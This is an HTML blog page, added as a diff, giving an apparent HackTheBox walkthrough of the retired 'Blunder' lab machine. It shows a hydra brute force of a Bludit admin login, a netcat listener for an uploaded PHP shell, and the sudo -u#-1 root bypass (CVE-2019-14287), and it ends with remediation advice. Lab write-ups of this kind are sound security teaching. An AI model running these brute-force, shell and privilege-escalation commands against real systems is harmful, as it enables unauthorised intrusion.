@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>HTB Blunder: Bludit brute force to shell, sudo bypass to root — Lucky Thandel</title>
+<meta name="description" content="Brute-forced Bludit admin plus upload RCE, then the iconic sudo -u#-1 bypass (CVE-2019-14287) walks past the user check. By Lucky Thandel.">
+<link rel="stylesheet" href="../../assets/css/style.css">
+</head>
+<body>
+<canvas id="matrix"></canvas>
+<div class="wrap">
+<nav class="nav">
+  <a class="logo" href="../../">lucky@thandel:~<span class="cursor">▊</span></a>
+  <a class="link" href="../../">./home</a>
+  <a class="link active" href="../">./articles</a>
+  <a class="link" href="../../about/">./about</a>
+  <a class="link" href="../../contact/">./contact</a>
+</nav>
+
+<div class="meta">2026-10-23 · retired-machine · by Lucky Thandel</div>
+<h1>HTB Blunder: Bludit brute force to shell, sudo bypass to root</h1>
+<div><span class="tag">retired-machine</span><span class="tag">easy</span></div>
+
+<div class="article-body">
+<p>Blunder is a retired HackTheBox easy Linux machine in two famous acts. Synopsis: a brute-forceable Bludit admin panel plus upload RCE, then the iconic sudo -u#-1 bypass (CVE-2019-14287) walking past the user check.</p>
+<h2><span class="amber">$</span> Enumeration — name the CMS</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: confirm Bludit, skip the rabbit holes</span>
+nmap -sC -sV -oN blunder.nmap 10.10.10.191
+# footer + generator: Bludit (flat-file CMS, no rate-limited login)</pre>
+<p>Apache with Bludit — a flat-file CMS whose login has no meaningful rate limiting. Version noted, wordlist loaded.</p>
+<h2><span class="amber">$</span> Foothold — brute force plus upload</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: hydra the admin, upload the shell</span>
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.191 http-post-form &quot;/admin/login:username=^USER^&amp;password=^PASS^:incorrect&quot;
+# logged in as admin -&gt; Images -&gt; upload shell (zip/image bypass per version) -&gt; browse to it
+nc -lvnp 4444   # www-data</pre>
+<p>Brute-force the admin password, log in, and abuse the image-upload path to land a PHP shell as www-data. The upload needs the session — brute force is the intended door.</p>
+<h2><span class="amber">$</span> Privilege escalation — sudo -u#-1 (CVE-2019-14287)</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: one flag past the user check</span>
+sudo -l   # (someuser) NOPASSWD: /bin/bash  (restricted to non-root user)
+sudo -u#-1 /bin/bash
+id   # uid=0(root)</pre>
+<p>Sudo mishandles user ID -1 (aliasing to 0 when no user holds UID 4294967295): one flag turns a user restriction into a root shell. Flag values redacted per HTB rules; earn them in your own lab.</p>
+<h2><span class="amber">$</span> Dead ends</h2>
+<p>Uploading shells before admin access and kernel exploits before sudo -l (the five-second check names the exact bypass).</p>
+<h2><span class="amber">$</span> Remediation notes</h2>
+<p>Rate-limit CMS logins, validate uploads outside the web root, patch sudo past 1.8.28, and re-audit user-restricted sudoers lines. Written by Lucky Thandel.</p>
+</div>
+
+<div class="byline">Written by <strong>Lucky Thandel</strong> · HTB walkthrough series · retired machines only — no spoilers for active boxes.</div>
+<p><a class="btn" href="../">← $ cd ../articles</a></p>
+
+<footer>
+  <span>© 2026 Lucky Thandel · written by Lucky Thandel</span>
+  <span>session <span id="session-clock">00:00:00</span> · <a href="../../contact/">contact</a></span>
+</footer>
+</div>
+<script src="../../assets/js/terminal.js"></script>
+</body>
+</html>
